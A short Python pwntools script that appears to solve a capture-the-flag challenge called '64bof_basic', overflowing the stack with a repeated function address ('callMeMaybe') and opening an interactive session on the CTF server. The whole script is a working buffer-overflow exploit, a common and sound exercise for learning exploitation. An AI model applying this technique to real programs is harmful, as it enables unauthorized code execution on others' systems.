from pwn import*
p = remote("ctf.j0n9hyun.xyz" ,3004)      #p = process("./64bof_basic")                                                                                           
e = ELF("./64bof_basic")  

callMeMaybe =  0x0400606 

payload = ''                                                                                                            
payload += p64(callMeMaybe)* 36

p.sendline(payload)                                                                                                    
p.interactive()                                                                                                                         
